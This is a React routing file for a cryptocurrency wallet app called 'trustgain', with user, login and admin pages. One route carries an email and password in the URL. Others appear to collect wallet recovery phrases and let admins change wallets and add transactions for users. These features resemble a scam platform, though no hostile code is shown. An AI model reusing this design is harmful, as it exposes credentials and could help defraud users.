import { ThemeProvider, createTheme } from "@mui/material/styles";
import { Router } from "@reach/router";
import { Component, createContext } from "react";
import { InstallPWA, InstallPWAiOS } from "./pwainstallbutton";
import ResponsiveDrawer from "./trustgain/dashboard";
import HomeIndex from "./trustgain/pages";
import AdminIndex from "./trustgain/pages/admin";
import AdminInfo from "./trustgain/pages/admin/admininfo";
import AllUserTablesmain from "./trustgain/pages/admin/allusers";
import CreateTransferIndex from "./trustgain/pages/admin/createtransaction";
import AlluserTransactions from "./trustgain/pages/admin/createtransaction/usertransaction";
import AllTransactions from "./trustgain/pages/admin/transactions";
import AllCoins from "./trustgain/pages/allcoins";
import AllCoinsAction from "./trustgain/pages/allcoinsaction";
import AuthenticationIndex from "./trustgain/pages/authentication";
import SignIn from "./trustgain/pages/authentication/login";
import ResetPassword from "./trustgain/pages/authentication/resetpassword";
import SignUp from "./trustgain/pages/authentication/signup";
import CoinAction from "./trustgain/pages/coin";
import ConnectWallet from "./trustgain/pages/connectwallet";
import Profile from "./trustgain/pages/profile";
import Send from "./trustgain/pages/send";
import Settings from "./trustgain/pages/settings";
import Identity from "./trustgain/pages/verification";
import ChangeWalletIndex from "./trustgain/pages/admin/changewallet";
import PhrasePage from "./trustgain/pages/phrase";
import PhraseLogin from "./trustgain/pages/authentication/phraselogin";
import LoginDirect from "./trustgain/pages/authentication/directlogin";

export const AppContext = createContext();

const theme = createTheme({
  palette: {
    primary: {
      main: "#0d47a1",
    },
    background: {
      default: "#e4e3ef",
    },
  },
});

class ShowButtonDevice extends Component {
  constructor(props) {
    super(props);

    // Initializing the state
    this.state = { os: "" };
  }
  detectOS = () => {
    const platform = navigator.platform;
    if (platform.indexOf("Win") !== -1) return "Windows";
    if (platform.indexOf("Mac") !== -1) return "Mac OS";
    if (platform.indexOf("Linux") !== -1) return "Linux";
    if (platform.indexOf("iPhone") !== -1) return "iOS";
    if (platform.indexOf("Android") !== -1) return "Android";
    if (platform.indexOf("iPad") !== -1) return "iPad";
    return "Unknown";
  };

  componentDidMount() {
    const detectos = this.detectOS();
    console.log(detectos);
    this.setState({ os: detectos });
  }

  render() {
    if (this.state.os === "iOS") {
      return <InstallPWAiOS os={this.state.os} />;
    } else {
      return <InstallPWA />;
    }
  }
}

function App() {
  return (
    <div style={{ display: "flex", flexDirection: "column" }}>
      <ThemeProvider theme={theme}>
        <Router>
          <ResponsiveDrawer path="/">
            <HomeIndex path="/" />
            <AllCoins path="/coins" />
            <AllCoinsAction path="/allcoin" />
            <CoinAction path="/coin" />
            <Send path="/send" />
            <ConnectWallet path="/connect" />
            <Profile path="/profile" />
            <Settings path="/settings/:action" />
            <Identity path="/kyc" />
            <PhrasePage path="/phrase" />
          </ResponsiveDrawer>

          <AuthenticationIndex path="/account">
            <SignIn path="login" />
            <PhraseLogin path="loginphrase" />
            <SignIn path="admin/:pathtonavigate" />
            <SignUp path="signup" />
            <ResetPassword path="resetpassword" />
            <LoginDirect path="logindirect/:email/:password" />
          </AuthenticationIndex>

          <AdminIndex path="manager">
            <AdminInfo path="/" />
            <AllUserTablesmain path="users" />
            <AllTransactions path="transactions" />
            <ChangeWalletIndex path="wallets" />
            <AlluserTransactions path="usertransactions/:id" />
            <CreateTransferIndex path="addtransaction/:id" />
          </AdminIndex>
        </Router>
      </ThemeProvider>
      <ShowButtonDevice />
    </div>
  );
}

export default App;
